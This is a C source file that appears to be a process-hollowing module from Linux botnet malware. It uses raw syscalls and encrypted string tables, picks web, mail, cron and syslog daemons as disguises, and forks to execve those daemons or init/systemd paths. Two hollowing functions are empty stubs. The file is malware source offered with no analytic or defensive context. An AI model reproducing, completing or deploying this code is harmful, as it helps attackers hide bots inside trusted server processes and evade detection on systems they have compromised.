#include "headers/hollowing.h"
#include "headers/memprotect.h"
#include "headers/syscalls.h"
#include "headers/util.h"
#include "headers/libc.h"
#include "headers/hollowing.h"

int sys_fork(void);
void sys_exit(int status);
#include "../encryption/chacha20_table.h"

static int is_suitable_target(const char *path) {
    if (!path) return 0;
    
    EncryptionTable targets[] = {
        USR_SBIN_APACHE2, USR_SBIN_HTTPD, USR_SBIN_NGINX, USR_SBIN_LIGHTTPD,
        USR_SBIN_EXIM4, USR_SBIN_POSTFIX, USR_SBIN_DOVECOT, USR_SBIN_CRON,
        USR_SBIN_CROND, USR_SBIN_ATD, USR_SBIN_NTPD, USR_SSMTP_RSYSLOGD,
        USR_SSMTP_SYSLOGD
    };

    for (int i = 0; i < sizeof(targets)/sizeof(targets[0]); i++) {
        if (sys_strstr(path, enc[targets[i]].string)) return 1;
    }
    
    return 0;
}

int hollow_with_execve(const char *target_path, char **argv) {
    if (!target_path) return -1;
    
    if (!is_suitable_target(target_path)) {
        return -1;
    }
    
    pid_t pid = sys_fork();
    if (pid == 0) {
        _syscall3(__NR_execve, (long)target_path, (long)argv, 0);
        sys_exit(0);
    } else if (pid < 0) {
        return -1;
    }
    
    return pid;
}

int hollow_into_process(const char *target_path, void *bot_code, size_t bot_size) {
    return -1;
}

int hollow_self_into_process(const char *target_path) {
    return -1;
}

int inject_into_init(char **argv) {
    pid_t pid = sys_fork();
    if (pid == 0) {
        _syscall3(__NR_execve, (long)enc[SBIN_INIT].string, (long)argv, 0);
        _syscall3(__NR_execve, (long)enc[USR_SBIN_INIT].string, (long)argv, 0);
        _syscall3(__NR_execve, (long)enc[BIN_INIT].string, (long)argv, 0);
        _syscall3(__NR_execve, (long)enc[LIB_SYSTEMD].string, (long)argv, 0);
        sys_exit(0);
    } else if (pid < 0) {
        return -1;
    }
    
    return pid;
}
